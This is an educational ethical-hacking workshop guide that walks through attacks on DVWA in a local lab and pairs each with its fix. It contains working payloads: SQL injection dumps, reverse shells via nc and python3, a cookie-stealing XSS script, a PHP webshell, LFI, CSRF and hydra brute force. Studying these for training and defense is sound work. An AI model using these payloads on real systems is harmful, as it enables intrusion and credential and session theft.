# Warning

This workshop is for educational purposes only, as part of the WOCSA ethical hacking workshops. All attacks in this document target **DVWA inside the CyberRange lab** (`http://localhost:8081`), an intentionally vulnerable training application. Never use these techniques against systems you do not own or have explicit written permission to test. Do not expose the lab to the Internet.

# Table of Contents

- [Warning](#warning)
- [Table of Contents](#table-of-contents)
- [Introduction](#introduction)
- [Prerequisites](#prerequisites)
- [Setup](#setup)
- [Lab Modules](#lab-modules)
  - [1. SQL Injection (sqli)](#1-sql-injection-sqli)
  - [2. Blind SQL Injection (sqli_blind)](#2-blind-sql-injection-sqli_blind)
  - [3. Command Injection (exec)](#3-command-injection-exec)
  - [4. Reflected & Stored XSS (xss_r, xss_s)](#4-reflected--stored-xss-xss_r-xss_s)
  - [5. DOM XSS (xss_d)](#5-dom-xss-xss_d)
  - [6. File Inclusion (fi)](#6-file-inclusion-fi)
  - [7. File Upload (upload)](#7-file-upload-upload)
  - [8. CSRF (csrf)](#8-csrf-csrf)
  - [9. Weak Session IDs (weak_id)](#9-weak-session-ids-weak_id)
  - [10. Brute Force (brute)](#10-brute-force-brute)
  - [11. Insecure CAPTCHA (captcha)](#11-insecure-captcha-captcha)
  - [12. CSP Bypass (csp)](#12-csp-bypass-csp)
  - [13. JavaScript (javascript)](#13-javascript-javascript)
  - [14. Auth Bypass (authbypass)](#14-auth-bypass-authbypass)
- [SQL Injection Deep Dive](#sql-injection-deep-dive)
- [Defense](#defense)
- [Takeaways Checklist](#takeaways-checklist)
- [Resources](#resources)

# Introduction

**DVWA** (Damn Vulnerable Web Application) is a deliberately insecure PHP/MySQL application used to practice web application security: it ships with a dozen vulnerability exercises, each at four difficulty levels (*low*, *medium*, *high*, *impossible*). The *impossible* level shows the hardened code, so every exercise is also a defense lesson.

**OWASP Top 10** is the OWASP community's list of the most critical web application security risks. The current edition (2021) lists:

1. **A01 – Broken Access Control**
2. **A02 – Cryptographic Failures**
3. **A03 – Injection**
4. **A04 – Insecure Design**
5. **A05 – Security Misconfiguration**
6. **A06 – Vulnerable and Outdated Components**
7. **A07 – Identification and Authentication Failures**
8. **A08 – Software and Data Integrity Failures**
9. **A09 – Security Logging and Monitoring Failures**
10. **A10 – Server-Side Request Forgery (SSRF)**

How this workshop maps DVWA modules to the Top 10:

| DVWA module | URL | OWASP Top 10 (2021) |
|---|---|---|
| SQL Injection | `/vulnerabilities/sqli/` | A03 – Injection |
| Blind SQL Injection | `/vulnerabilities/sqli_blind/` | A03 – Injection |
| Command Injection | `/vulnerabilities/exec/` | A03 – Injection |
| Reflected XSS | `/vulnerabilities/xss_r/` | A03 – Injection |
| Stored XSS | `/vulnerabilities/xss_s/` | A03 – Injection |
| DOM XSS | `/vulnerabilities/xss_d/` | A03 – Injection |
| File Inclusion | `/vulnerabilities/fi/` | A03 – Injection |
| File Upload | `/vulnerabilities/upload/` | A04 – Insecure Design (A03) |
| CSRF | `/vulnerabilities/csrf/` | A01 – Broken Access Control |
| Weak Session IDs | `/vulnerabilities/weak_id/` | A07 – Identification and Authentication Failures |
| Brute Force | `/vulnerabilities/brute/` | A07 – Identification and Authentication Failures |
| Insecure CAPTCHA | `/vulnerabilities/captcha/` | A05 – Security Misconfiguration (A07) |
| CSP Bypass | `/vulnerabilities/csp/` | A05 – Security Misconfiguration |
| JavaScript | `/vulnerabilities/javascript/` | A04 – Insecure Design (A05) |
| Auth Bypass | `/vulnerabilities/authbypass/` | A07 – Identification and Authentication Failures (A01) |

All facts in this document were verified against the live CyberRange lab (DVWA at `http://localhost:8081`, `admin`/`password`, `DVWA_SECURITY_LEVEL=low`). Security-level differences are marked explicitly.

# Prerequisites

- **The CyberRange DMZ profile** (DVWA + its database):
  ```bash
  cd CyberRange && docker compose --profile dmz up -d
  ```
- A browser (any) and `curl` (installed everywhere; on Windows use Git Bash or WSL).
- Optional but recommended: [Burp Suite](https://portswigger.net/burp) or [OWASP ZAP](https://www.zaproxy.org/) to intercept requests.
- Optional for later modules: `sqlmap`, `hydra`, and a `nc` listener for reverse shells / cookie stealing.

# Setup

1. **Start DVWA** (see Prerequisites), then open `http://localhost:8081`.
2. **Log in** with `admin` / `password`.
3. **First run only**: on a fresh `dvwa-db` volume, the login redirects to `http://localhost:8081/setup.php`. Click **Create / Reset Database** once, then log in again.
4. **Security level**: the CyberRange `.env` defaults to `DVWA_SECURITY_LEVEL=low`, so DVWA is already at *low*. To change it, use `http://localhost:8081/security.php` (low / medium / high / impossible). The POST needs a CSRF token (`user_token` in the page). Verified working curl pattern:

   ```bash
   # Get the page, extract the 32-hex user_token, then POST the new level
   curl -s -b /tmp/dvwa.jar http://localhost:8081/security.php -o /tmp/sec.html
   TOKEN=$(grep -oP 'user_token" value="\K[0-9a-f]{32}' /tmp/sec.html)
   curl -s -b /tmp/dvwa.jar \
     -d "security=low&seclev_submit=seclev_submit&user_token=$TOKEN" \
     http://localhost:8081/security.php -o /dev/null
   ```

5. **Session cookie jar for all following curl commands** (same verified pattern, needed because the login POST also requires `user_token`):

   ```bash
   curl -s -c /tmp/dvwa.jar http://localhost:8081/login.php -o /tmp/login.html
   TOKEN=$(grep -oP 'user_token" value="\K[0-9a-f]{32}' /tmp/login.html)
   curl -s -b /tmp/dvwa.jar -c /tmp/dvwa.jar \
     -d "username=admin&password=password&Login=Login&user_token=$TOKEN" \
     http://localhost:8081/login.php -o /dev/null
   # From now on: curl -s -b /tmp/dvwa.jar http://localhost:8081/...
   ```

   > On Windows, replace `grep -oP` with PowerShell regex or use WSL/Git Bash.

6. **Available vulnerability pages** (verified list under `/var/www/html/vulnerabilities/`): `authbypass`, `brute`, `captcha`, `csp`, `csrf`, `exec`, `fi`, `javascript`, `sqli`, `sqli_blind`, `tops3cr3t` (bonus/easter-egg page, not covered here), `upload`, `weak_id`, `xss_d`, `xss_r`, `xss_s`. Each one is reachable at `http://localhost:8081/vulnerabilities/<name>/` and its source code at `http://localhost:8081/vulnerabilities/<name>/source/<level>.php`.

# Lab Modules

Each module: concept → Top 10 category → exploit at LOW (verified) → what changes at MEDIUM/HIGH (read it yourself in the in-app source pages) → fix.

## 1. SQL Injection (sqli)

- **Concept**: user input is concatenated into an SQL query. At low, `$id` from the URL goes straight into `SELECT first_name, last_name FROM users WHERE user_id = '$id'`.
- **Top 10**: A03 – Injection.
- **Exploit (LOW)**:
  ```bash
  # Normal: returns "First name: admin"
  curl -s -b /tmp/dvwa.jar "http://localhost:8081/vulnerabilities/sqli/?id=1&Submit=Submit"
  # Break the query: id=%27 (a quote) triggers a MySQL syntax error -> injectable
  curl -s -b /tmp/dvwa.jar "http://localhost:8081/vulnerabilities/sqli/?id=%27&Submit=Submit"
  # Dump the users table (2 columns expected by the SELECT):
  curl -s -b /tmp/dvwa.jar "http://localhost:8081/vulnerabilities/sqli/?id=1%27%20UNION%20SELECT%20user,password%20FROM%20users%23&Submit=Submit"
  ```
  You get `admin` and its MD5 password hash (DVWA stores MD5 — instantly crackable). Full walkthrough and `sqlmap` automation in the [SQL Injection Deep Dive](#sql-injection-deep-dive).
- **Medium**: the `id` comes from a POST form (dropdown) and is run through `mysqli_real_escape_string`, which kills the quote — but the value is not quoted in the query, so numeric payloads still work (send the POST directly with curl).
- **High**: same query with `LIMIT 1` and the value carried in the session — still injectable with the same numeric trick.
- **Impossible**: PDO prepared statements with bound parameters — the input can never become SQL. **Fix: always use prepared statements / parameterized queries.**

## 2. Blind SQL Injection (sqli_blind)

- **Concept**: the query result is not displayed; the page only says whether a row was found. You infer data bit by bit from true/false answers or response timing.
- **Top 10**: A03 – Injection.
- **Exploit (LOW)** — boolean-based:
  ```bash
  # True -> "User ID exists in the database."
  curl -s -b /tmp/dvwa.jar "http://localhost:8081/vulnerabilities/sqli_blind/?id=1%27%20AND%201=1%23&Submit=Submit"
  # False -> "User ID is MISSING from the database."
  curl -s -b /tmp/dvwa.jar "http://localhost:8081/vulnerabilities/sqli_blind/?id=1%27%20AND%201=2%23&Submit=Submit"
  ```
  Time-based (response delayed ~5 s proves blind execution):
  ```bash
  time curl -s -b /tmp/dvwa.jar "http://localhost:8081/vulnerabilities/sqli_blind/?id=1%27%20AND%20SLEEP(5)%23&Submit=Submit"
  ```
  From here, extract data character by character, e.g. `1' AND SUBSTRING((SELECT password FROM users WHERE user_id=1),1,1)='5'#` — or let sqlmap do it: `sqlmap --cookie="PHPSESSID=<sid>; security=low" --technique=BT --dump -u "http://localhost:8081/vulnerabilities/sqli_blind/?id=1&Submit=Submit"`.
- **Medium**: switches to a POST form; **High**: adds `LIMIT 1` and session state — same injection techniques still apply.
- **Impossible**: prepared statements (see module 1). **Fix: same as SQLi — parameterized queries; plus limit DB error output.**

## 3. Command Injection (exec)

- **Concept**: the page runs `ping -c 4 <your input>` through the shell. At low there is no sanitization, so `;` chains arbitrary commands as the web server user (`www-data`) **inside the DVWA container**.
- **Top 10**: A03 – Injection.
- **Exploit (LOW)**:
  ```bash
  # Baseline
  curl -s -b /tmp/dvwa.jar --data-urlencode "ip=127.0.0.1" --data-urlencode "Submit=Submit" \
    http://localhost:8081/vulnerabilities/exec/
  # whoami -> www-data
  curl -s -b /tmp/dvwa.jar --data-urlencode "ip=127.0.0.1; whoami" --data-urlencode "Submit=Submit" \
    http://localhost:8081/vulnerabilities/exec/
  # List the web root (or any path)
  curl -s -b /tmp/dvwa.jar --data-urlencode "ip=127.0.0.1; ls -la /var/www/html" \
    --data-urlencode "Submit=Submit" http://localhost:8081/vulnerabilities/exec/
  ```
  > In a browser, put `127.0.0.1; whoami` in the form. In a raw URL, URL-encode spaces as `%20` and `;` as `%3B`.

  **Reverse shell** (container has `nc` (OpenBSD build), `python3`, `curl`, `php`):
  ```bash
  # 1. On YOUR machine (attacker): nc -lvnp 4444
  # 2. In the DVWA form / URL (URL-encoded):
  #    127.0.0.1; nc -e /bin/sh 10.5.10.1 4444
  #    encoded: 127.0.0.1%3B%20nc%20-e%20/bin/sh%2010.5.10.1%204444
  ```
  Address notes: `10.5.10.1` is the Docker bridge gateway of the DMZ network (= the lab host from the container's point of view); on Docker Desktop `host.docker.internal` usually works too. If `-e` is not supported by the nc build, fall back to the `python3` one-liner:
  ```bash
  127.0.0.1; python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("10.5.10.1",4444));[os.dup2(s.fileno(),f) for f in(0,1,2)];subprocess.call(["/bin/sh","-i"])'
  ```
- **Why it matters here**: DVWA is the **only pivot from the DMZ to the intranet** (tri-homed container, `10.5.20.20`). Once you have shell access you can reach the wiki, file server, metasploitable2 and the workstations — see the [CyberRange pivoting section](../../CyberRange/README.md#pivoting-and-isolation).
- **Medium**: strips `&&` and `;` (single `str_replace` pass — bypassable with `&`, `|`, or doubling); **High**: longer blacklist (`|`, space, `-`…); **Impossible**: whitelist — splits the input and only allows `n.n.n.n` octets. **Fix: never concatenate user input into shell commands; use safe APIs (e.g. `proc_open` with an argument array) or a strict whitelist.**

## 4. Reflected & Stored XSS (xss_r, xss_s)

- **Concept**: XSS executes attacker JavaScript in a victim's browser. *Reflected*: input is echoed back in the same response. *Stored*: input is saved (guestbook) and executed for every visitor — more dangerous.
- **Top 10**: A03 – Injection (XSS merged into Injection in the 2021 edition).
- **Exploit (LOW)** — reflected:
  ```bash
  curl -s -b /tmp/dvwa.jar --data-urlencode 'name=<script>alert(1)</script>' \
    --data-urlencode 'Submit=Submit' http://localhost:8081/vulnerabilities/xss_r/
  # In a browser: type <script>alert(1)</script> in the name field, submit -> alert pops.
  ```
  Stored (guestbook): enter `<script>alert(1)</script>` as the name and a short message, submit; the alert now fires on **every** page view.

  **Cookie stealing** (stored XSS is the classic vector; the `PHPSESSID` is the target):
  ```html
  <script>new Image().src="http://10.5.10.1:8000/?c="+document.cookie</script>
  ```
  Listen with `nc -lvnp 8000` (or `python3 -m http.server 8000`) on your machine; when a victim opens the guestbook, their cookie arrives in the listener. In this lab the victim is yourself in another browser/session — same mechanics.
- **Medium**: `str_replace('<script>', '')` (case-sensitive, single pass — bypass with `<SCRIPT>` or `<scr<script>ipt>`); stored: `strip_tags` on both fields (bypass with `<img src=x onerror=alert(1)>`). **High**: regex stripping of script tags (still bypassable in many builds); stored: message is `htmlspecialchars`'d but the name field stays weak. **Impossible**: `htmlspecialchars` on every output field. **Fix: encode all output (`htmlspecialchars`), and use a Content Security Policy.**

## 5. DOM XSS (xss_d)

- **Concept**: the injection happens entirely in the browser: JavaScript reads data from the URL (the `default=` parameter and the fragment after `#`) and writes it into the page with `document.write` — the server never sees the payload.
- **Top 10**: A03 – Injection.
- **Exploit (LOW)** — the payload goes in the URL **fragment**, so it is never sent to the server:
  ```
  http://localhost:8081/vulnerabilities/xss_d/?default=English#<script>alert(1)</script>
  ```
  The page's JavaScript picks up the fragment and `document.write`s it as an `<option>` — the alert fires without any server round-trip.
- **Medium**: the JS strips `<` characters from the value; **High**: the value must match one of the whitelisted languages or an error is written; **Impossible**: no user input flows into the DOM. **Fix: treat all DOM writes as sinks — never pass raw location data to `innerHTML`/`document.write`; use `textContent` and encode.**

## 6. File Inclusion (fi)

- **Concept**: the page takes a `page` parameter and `include()`s that file. *Local File Inclusion (LFI)* reads local files; *Remote File Inclusion (RFI)* would execute code from a URL.
- **Top 10**: A03 – Injection.
- **Exploit (LOW)** — path traversal to read `/etc/passwd`:
  ```bash
  curl -s -b /tmp/dvwa.jar "http://localhost:8081/vulnerabilities/fi/?page=../../../../etc/passwd"
  ```
  Also try the classic `?page=../../../../proc/self/environ` or the DVWA config files under `/var/www/html/`.
- **RFI note**: RFI (`?page=http://evil/shell.txt`) only works if PHP is configured with `allow_url_include=On`. In this container (like most modern DVWA builds) it is disabled, so low-level RFI fails while LFI works — check the `phpinfo()` page of DVWA to confirm. That is why LFI-to-RCE tricks (log poisoning, `php://filter`, `data://`) are the realistic path here.
- **Medium**: strips `http://`, `https://`, `../`, `..\` (double-encode to bypass); **High**: the file must start with the literal string `file`; **Impossible**: hard-coded whitelist of exactly three files. **Fix: whitelist files explicitly — never build include paths from user input.**

## 7. File Upload (upload)

- **Concept**: the page stores uploaded files in `/var/www/html/hackable/uploads/` and serves them back as static content. At low, *anything* can be uploaded — including a PHP webshell.
- **Top 10**: A04 – Insecure Design (missing design-time controls; also A03 for the resulting code execution).
- **Exploit (LOW)** — upload a one-line PHP webshell and run commands:
  ```bash
  cat > /tmp/shell.php <<'EOF'
  <?php echo shell_exec($_GET["c"]); ?>
  EOF
  curl -s -b /tmp/dvwa.jar -F "uploaded=@/tmp/shell.php" -F "Upload=Upload" \
    http://localhost:8081/vulnerabilities/upload/
  # The page prints the path. Execute commands:
  curl "http://localhost:8081/hackable/uploads/shell.php?c=id"     # uid=33(www-data)
  curl "http://localhost:8081/hackable/uploads/shell.php?c=ls%20-la%20/var/www/html"
  ```
  (The `hackable/uploads/` directory already contains the placeholder `dvwa_email.png`.)
- **Medium**: requires `Content-Type: image/jpeg` and size < 100 000 bytes — bypass by forcing the type in the request (`-F "uploaded=@shell.php;type=image/jpeg"`). **High**: adds a real image check (`getimagesize`) and an extension whitelist — embed the PHP in an image file (e.g. in a JPEG comment) combined with another trick (LFI from module 6, double extension, or `.phtml`). **Impossible**: the image is fully re-encoded server-side, destroying any embedded payload. **Fix: re-encode uploads, whitelist extensions + MIME, store outside the web root, serve with a neutral Content-Type.**

## 8. CSRF (csrf)

- **Concept**: Cross-Site Request Forgery makes a *logged-in* user's browser send a state-changing request the attacker crafted. At low the password-change form has no anti-CSRF token and accepts GET, so a plain auto-submitting page works.
- **Top 10**: A01 – Broken Access Control.
- **Exploit (LOW)** — serve this HTML page to a logged-in victim (in the lab: yourself in a second tab/browser):
  ```html
  <html><body>
  <form action="http://localhost:8081/vulnerabilities/csrf/" method="GET">
    <input type="hidden" name="password_new" value="hacked">
    <input type="hidden" name="password_conf" value="hacked">
    <input type="hidden" name="Change" value="Change">
  </form>
  <script>document.forms[0].submit()</script>
  </body></html>
  ```
  The victim's admin password becomes `hacked` with no visible interaction. To see the raw request, simply browse:
  ```
  http://localhost:8081/vulnerabilities/csrf/?password_new=hacked&password_conf=hacked&Change=Change
  ```
- **Medium**: the application checks the `Referer` header must contain the server name — a same-site verification that blocks plain cross-origin pages (bypassable by hosting the attack page on a path that contains the hostname). **High**: adds the `user_token` anti-CSRF token — the attacker must first read it out (e.g. via the XSS of module 4). **Impossible**: token + the current password is required. **Fix: per-request CSRF tokens, `SameSite` cookies, and require re-authentication for sensitive actions.**

## 9. Weak Session IDs (weak_id)

- **Concept**: the module generates session IDs for itself. At low they are **sequential**: each click of *Generate* increments the value — anyone can predict the next session and hijack it.
- **Top 10**: A07 – Identification and Authentication Failures.
- **Exploit (LOW)**:
  ```bash
  # Generate a few IDs and watch the cookie increase by 1 each time:
  for i in 1 2 3; do
    curl -s -b /tmp/dvwa.jar -c /tmp/dvwa.jar -D - \
      -d "help=Generate" http://localhost:8081/vulnerabilities/weak_id/ \
      | grep -i "dvwaSession" | head -1
  done
  ```
  In a browser: open the page, click **Generate**, and inspect the `dvwaSession` cookie in DevTools — each click yields the previous value + 1. Guessing the "next" session ID = session hijacking (combine with `fixation`: set that cookie yourself and wait for a victim to log in).
- **Medium**: the ID becomes `time()`-based (epoch seconds — still guessable); **High**: random `md5` value; **Impossible**: `sha1(random())` with `httponly` + `SameSite`. **Fix: use the framework's cryptographically random session IDs (PHP default), `httponly`/`secure`/`SameSite` flags, and regenerate the ID at login.**

## 10. Brute Force (brute)

- **Concept**: the login form has no rate limiting, no lockout, and at low level **no CSRF token**, so automation can hammer it freely.
- **Top 10**: A07 – Identification and Authentication Failures.
- **Exploit (LOW)** — `hydra` one-liner (verified against the range; adjust `<sid>` to your `PHPSESSID` and point at your wordlist — note `F=` must come **last**):
  ```bash
  hydra -l admin -P /usr/share/wordlists/rockyou.txt \
    "http-get-form://localhost:8081/vulnerabilities/brute/:username=^USER^&password=^PASS^&Login=Login:H=Cookie: PHPSESSID=<sid>; security=low:F=incorrect"
  ```
  The page also accepts GET parameters (`http://localhost:8081/vulnerabilities/brute/?username=...&password=...&Login=Login`), which works with hydra's `http-get` module the same way.
  Manual loop with the same login pattern (also works at medium with the CSRF token added):
  ```bash
  for p in password 123456 admin letmein; do
    TOKEN=$(curl -s -b /tmp/dvwa.jar http://localhost:8081/vulnerabilities/brute/ \
      | grep -oP 'user_token" value="\K[0-9a-f]{32}')
    if ! curl -s -b /tmp/dvwa.jar \
      -d "username=admin&password=$p&Login=Login&user_token=$TOKEN" \
      http://localhost:8081/vulnerabilities/brute/ | grep -q "incorrect"; then
      echo "FOUND: $p"; break
    fi
  done
  ```
- **Medium**: adds the `user_token` — each attempt must first fetch the page (the loop above does exactly that); **High**: adds an account lockout + random delay; **Impossible**: hard lockout of the user (and IP) with a countdown. **Fix: rate limiting, exponential backoff, account lockout, CAPTCHA, and 2FA.**

## 11. Insecure CAPTCHA (captcha)

- **Concept**: a CAPTCHA that is only *pretended*: at low level the "puzzle" is a two-step form where the step number is a client-supplied hidden field — skipping to step 2 skips the CAPTCHA entirely. It also illustrates trusting client-side flags.
- **Top 10**: A05 – Security Misconfiguration / A07 (broken anti-automation control).
- **Exploit (LOW)**: submit the password-change form **directly with `step=2`**, never visiting step 1. In a browser: intercept the step-1 POST (Burp/ZAP) and change `step=1` to `step=2`; the server accepts it and changes the password without any CAPTCHA verification.
- **Medium**: requires `passed_captcha=true` in the request — still a client-supplied flag, same bypass; **High**: the CAPTCHA answer is verified server-side (defeats the flag trick, leaving you with real CAPTCHA solving/OCR or finding another flaw). **Fix: verify CAPTCHA server-side, tie the token to the session and one-time use.**

## 12. CSP Bypass (csp)

- **Concept**: Content Security Policy tells the browser which script sources are allowed. A *lax* CSP (whole third-party domains allowed, or JSONP endpoints) defeats the defense even though a policy "exists" — this is the security-misconfiguration trap.
- **Top 10**: A05 – Security Misconfiguration.
- **Exploit (LOW)**: the low policy whitelists whole external domains (e.g. `example.com`, `pastebin.com`) instead of exact script URLs. The page has an input asking for a script URL; enter the raw URL of any JavaScript you can host on a whitelisted domain (classic demo: a pastebin "raw" URL containing `alert(document.cookie)`) and the script executes — the CSP is satisfied because the domain is allowed.
- **Medium**: switches to a nonce-based policy (`nonce-<random>`): inline scripts without the nonce die, but the form lets you paste a script and injects the nonce — still game. **High**: allows only `example.com` JSONP (`jsonp.php?callback=...`) — inject `callback=alert` to execute; **Impossible**: strict nonce, no unsafe-inline, no JSONP. **Fix: strict CSP with nonces or hashes, no `unsafe-inline`, no third-party wildcards; test with CSP evaluators.**

## 13. JavaScript (javascript)

- **Concept**: the "protection" is entirely client-side JavaScript: the page decides success/failure in the browser and the magic phrase is hard-coded in the page source (`success`). The server trusts whatever the client sends — an insecure design.
- **Top 10**: A04 – Insecure Design (also A05: relying on client-side controls as security).
- **Exploit (LOW)** — just submit the phrase (server never actually checks it; it only reads the form):
  ```bash
  curl -s -b /tmp/dvwa.jar http://localhost:8081/vulnerabilities/javascript/ -o /tmp/js.html
  TOKEN=$(grep -oP 'user_token" value="\K[0-9a-f]{32}' /tmp/js.html)
  curl -s -b /tmp/dvwa.jar \
    -d "phrase=success&send=Submit&user_token=$TOKEN" \
    http://localhost:8081/vulnerabilities/javascript/
  ```
  In a browser: read the source (F12) to see `success` checked in JS, then type `success` — or disable JS / replay the POST and the "validation" is gone. There is no meaningful security-level progression for this module because client-side checks can always be replayed; higher levels only rearrange the script. **Fix: never enforce security client-side; re-validate everything server-side.**

## 14. Auth Bypass (authbypass)

- **Concept**: the challenge flow is "fetch the user-details form, then submit changes" — the login step is checked on the form-fetch page, but the *submit* page only verifies that a `Login` parameter is present. Sending `Login` in the **same request** as the form submission satisfies both pages at once: one request does the login and the change, bypassing the intended two-step authentication.
- **Top 10**: A07 – Identification and Authentication Failures (A01 flavor).
- **Exploit (LOW)** — per the DVWA docs, combine the form fetch and the submit into a single POST carrying `Login=Login`:
  ```bash
  curl -s -b /tmp/dvwa.jar -c /tmp/dvwa.jar \
    -X POST -d "Login=Login" \
    "http://localhost:8081/vulnerabilities/authbypass/change_user_details.php"
  # Add the form fields shown in the page HTML (name, age, address...)
  # so the details change and the login are done in ONE request.
  ```
  The module's own help text describes exactly this single-request trick; the lesson is that authentication must be enforced **on every state-changing endpoint**, not just on the page that renders the form.
- **Medium/High**: add session-based and token-based checks on the submit page (the one-request trick stops working). **Fix: server-side session check + CSRF token on every POST, never trust "Login" as a parameter.**

# SQL Injection Deep Dive

The most instructive module, done fully by hand and then automated.

**1. Confirm the injection point** (verified live):

```bash
curl -s -b /tmp/dvwa.jar "http://localhost:8081/vulnerabilities/sqli/?id=1&Submit=Submit"
# -> "First name: admin" (normal output)
curl -s -b /tmp/dvwa.jar "http://localhost:8081/vulnerabilities/sqli/?id=%27&Submit=Submit"
# -> MySQL syntax error message -> the quote broke the query -> injectable
```

**2. Find the number of columns** with `ORDER BY` (the page errors when the column index is too high):

```bash
# Each of these works (2 columns):
curl -s -b /tmp/dvwa.jar "http://localhost:8081/vulnerabilities/sqli/?id=1%27%20ORDER%20BY%201%23&Submit=Submit"
curl -s -b /tmp/dvwa.jar "http://localhost:8081/vulnerabilities/sqli/?id=1%27%20ORDER%20BY%202%23&Submit=Submit"
# This one errors -> the SELECT has exactly 2 columns:
curl -s -b /tmp/dvwa.jar "http://localhost:8081/vulnerabilities/sqli/?id=1%27%20ORDER%20BY%203%23&Submit=Submit"
```

**3. Find which columns are displayed** (`UNION SELECT 1,2` maps "1" and "2" into the First name / Surname fields):

```bash
curl -s -b /tmp/dvwa.jar "http://localhost:8081/vulnerabilities/sqli/?id=1%27%20UNION%20SELECT%201,2%23&Submit=Submit"
# -> "First name: 1" / "Surname: 2" -> both columns echo back
```

**4. Extract data** (the `users` table holds `user` and `password`; the default `admin` row is what the `id=1` page already showed):

```bash
curl -s -b /tmp/dvwa.jar "http://localhost:8081/vulnerabilities/sqli/?id=1%27%20UNION%20SELECT%20user,password%20FROM%20users%23&Submit=Submit"
# -> admin : <MD5 hash>
```

The hash is MD5 (DVWA stores unsalted MD5) — crack it with `hashcat -m 0` / John / any online lookup, or use the fact that DVWA's DB credentials (`dvwa` / `p@ssw0rd`) sit in plain sight in the module's own source at `http://localhost:8081/vulnerabilities/sqli/source/low.php` — a nice reminder that source disclosure (misconfiguration) hands attackers the whole schema.

**5. Automate with sqlmap** (verified working pattern — the cookies are mandatory):

```bash
sqlmap -u "http://localhost:8081/vulnerabilities/sqli/?id=1&Submit=Submit" \
  --cookie="PHPSESSID=<sid>; security=low" \
  --dump
```

`--dump` enumerates and dumps the database (`dvwa` → `users`, `guestbook`). Useful flags: `--batch` (auto-answer), `--current-db`, `--tables`, `--columns`, `--passwords`. For the blind module add `--technique=BT`; for the medium-level POST variant use `--data "id=1&Submit=Submit"` instead of the URL parameter.

# Defense

For every module, the *impossible* level is a ready-made patch — read it in-app at `/vulnerabilities/<name>/source/impossible.php`:

| Vulnerability | Real-world fix |
|---|---|
| SQLi / Blind SQLi | Prepared statements / parameterized queries (PDO), least-privilege DB user, hide DB errors |
| Command Injection | Never shell out with user input; argument-array APIs; strict input whitelist |
| XSS (reflected/stored/DOM) | Context-aware output encoding (`htmlspecialchars`), safe DOM APIs (`textContent`), CSP |
| File Inclusion | Explicit file whitelist; disable remote includes (`allow_url_include=Off`); `open_basedir` |
| File Upload | Re-encode images, extension + MIME whitelist, store outside webroot, random filenames, antivirus |
| CSRF | Per-request CSRF tokens, `SameSite=Lax/Strict`, re-authentication for sensitive actions |
| Weak Session IDs | Cryptographically random session IDs, regenerate on login, `HttpOnly`/`Secure`/`SameSite` |
| Brute Force | Rate limiting, lockout + backoff, CAPTCHA, 2FA |
| Insecure CAPTCHA | Server-side verification, one-time tokens bound to the session |
| CSP Bypass | Strict CSP (nonces/hashes), no `unsafe-inline`, no third-party wildcards, no JSONP |
| JavaScript | Treat client-side checks as UX only — enforce everything server-side |
| Auth Bypass | Session check + CSRF token on every state-changing endpoint |

General habits: input validation (server-side), output encoding, least privilege, fail-closed error handling, and log + monitor authentication events (A09).

# Takeaways Checklist

- [ ] Logged into DVWA at `http://localhost:8081` (`admin`/`password`), ran `setup.php` on first boot, set security to **low**
- [ ] Extracted `user_token` from a page and used the curl cookie-jar login/setup pattern
- [ ] Dumped the `users` table with `UNION SELECT` (manual) and `sqlmap --dump` (automatic)
- [ ] Proved blind SQLi with `AND 1=1` vs `AND 1=2` and `SLEEP(5)`
- [ ] Got `www-data` command execution via `exec` (and, optionally, a reverse shell)
- [ ] Fired a reflected, stored and DOM XSS alert; stolen a cookie over a `nc` listener
- [ ] Read `/etc/passwd` via LFI and explained why RFI fails in this container
- [ ] Uploaded a PHP webshell and ran `id` through `/hackable/uploads/shell.php`
- [ ] Changed the admin password with a one-page CSRF attack
- [ ] Observed sequential `dvwaSession` IDs at low level
- [ ] Brute-forced the login with hydra (or the token loop) at low level
- [ ] Bypassed the CAPTCHA step and the JavaScript client-side check
- [ ] Bypassed the authbypass login with the single-request `Login` trick
- [ ] For each module: read the `source/impossible.php` fix and named the corresponding real-world defense

# Resources

- [DVWA (Damn Vulnerable Web Application)](https://github.com/digininja/DVWA)
- [DVWA Docker image used by the range (cytopia/dvwa)](https://github.com/cytopia/docker-dvwa)
- [OWASP Top 10 (2021)](https://owasp.org/www-project-top-ten/)
- [OWASP SQL Injection Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html)
- [OWASP XSS Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html)
- [sqlmap](https://sqlmap.org/) and [hydra](https://github.com/vanhauser-thc/thc-hydra)
- [CyberRange README](../../CyberRange/README.md) — the lab architecture and the [pivoting story](../../CyberRange/README.md#pivoting-and-isolation) that starts with DVWA

**Summary:** DVWA at localhost:8081 was used to practice 14 OWASP Top 10 exercises (SQLi, blind SQLi, command injection, XSS x3, LFI, file upload, CSRF, weak session IDs, brute force, CAPTCHA, CSP, JavaScript, auth bypass) at the low security level, then each exploit was mapped to its Top 10 2021 category and its hardened "impossible"-level fix.
